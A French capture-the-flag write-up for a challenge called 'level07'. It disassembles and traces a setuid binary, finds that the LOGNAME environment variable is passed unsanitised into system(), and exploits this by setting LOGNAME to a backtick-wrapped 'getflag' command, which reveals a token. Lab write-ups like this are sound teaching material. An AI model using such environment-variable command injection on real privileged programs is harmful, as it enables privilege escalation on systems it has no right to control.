# LEvel 07

- On commence par regarder ce qu'on a avec `ls -la`
```
level07
```
On a un binaire avec des sticky rights qu'on commence a bien connaitre.
Maintenant il faut comprendre ce qu'il fait:
- `strings`
RAS

- Du coup tristesse, la seule option qui nous reste : dump le binaire pour essayer de comprendre `objdump -D level07`

```objdump
08048514 <main>:
 8048514:	55                   	push   %ebp
 8048515:	89 e5                	mov    %esp,%ebp
 8048517:	83 e4 f0             	and    $0xfffffff0,%esp
 804851a:	83 ec 20             	sub    $0x20,%esp
 804851d:	e8 ce fe ff ff       	call   80483f0 <getegid@plt>
 8048522:	89 44 24 18          	mov    %eax,0x18(%esp)
 8048526:	e8 b5 fe ff ff       	call   80483e0 <geteuid@plt>
 804852b:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 804852f:	8b 44 24 18          	mov    0x18(%esp),%eax
 8048533:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048537:	8b 44 24 18          	mov    0x18(%esp),%eax
 804853b:	89 44 24 04          	mov    %eax,0x4(%esp)
 804853f:	8b 44 24 18          	mov    0x18(%esp),%eax
 8048543:	89 04 24             	mov    %eax,(%esp)
 8048546:	e8 05 ff ff ff       	call   8048450 <setresgid@plt>
 804854b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 804854f:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048553:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048557:	89 44 24 04          	mov    %eax,0x4(%esp)
 804855b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 804855f:	89 04 24             	mov    %eax,(%esp)
 8048562:	e8 69 fe ff ff       	call   80483d0 <setresuid@plt>
 8048567:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
 804856e:	00
 804856f:	c7 04 24 80 86 04 08 	movl   $0x8048680,(%esp)
 8048576:	e8 85 fe ff ff       	call   8048400 <getenv@plt>
 804857b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804857f:	c7 44 24 04 88 86 04 	movl   $0x8048688,0x4(%esp)
 8048586:	08
 8048587:	8d 44 24 14          	lea    0x14(%esp),%eax
 804858b:	89 04 24             	mov    %eax,(%esp)
 804858e:	e8 ad fe ff ff       	call   8048440 <asprintf@plt>
 8048593:	8b 44 24 14          	mov    0x14(%esp),%eax
 8048597:	89 04 24             	mov    %eax,(%esp)
 804859a:	e8 71 fe ff ff       	call   8048410 <system@plt>
 804859f:	c9                   	leave
 80485a0:	c3                   	ret
 80485a1:	90                   	nop
 80485a2:	90                   	nop
 80485a3:	90                   	nop
 80485a4:	90                   	nop
 80485a5:	90                   	nop
 80485a6:	90                   	nop
 80485a7:	90                   	nop
 80485a8:	90                   	nop
 80485a9:	90                   	nop
 80485aa:	90                   	nop
 80485ab:	90                   	nop
 80485ac:	90                   	nop
 80485ad:	90                   	nop
 80485ae:	90                   	nop
 80485af:	90                   	nop
```
- On repère la fonction asprintf qui semble print le nom du fichier
- On voit un getenv
- Pour mieux comprendre on fait un ltrace qui trace les appels aux librairies du binaire

`ltrace ./level07` result:
```
__libc_start_main(0x8048514, 1, 0xbffff6f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                 = 2007
geteuid()                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
getenv("LOGNAME")                                         = "level07"
asprintf(0xbffff644, 0x8048688, 0xbfffff28, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                    = 0
+++ exited (status 0) +++
```

On repère un appelle de variable d'env "LOGNAME" suivi d'un call `system()` ou on aimerai injecter du code

```python
getenv("LOGNAME") = "level07"
system("/bin/echo level07 ")
```

Avec un peu de chance le `level07` de l'appel systeme `bin/echo level07` vient de la variable logname. verifions cela:

```bash
strings ./level07 | grep %s
/bin/echo %s
```

On remplace `LOGNAME` par `getflag` (backticks) pour run `/bin/echo 'getflag'`

```bash
export LOGNAME="\`getflag\`"
./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Tadaaa !

## 🔥 Password = flag
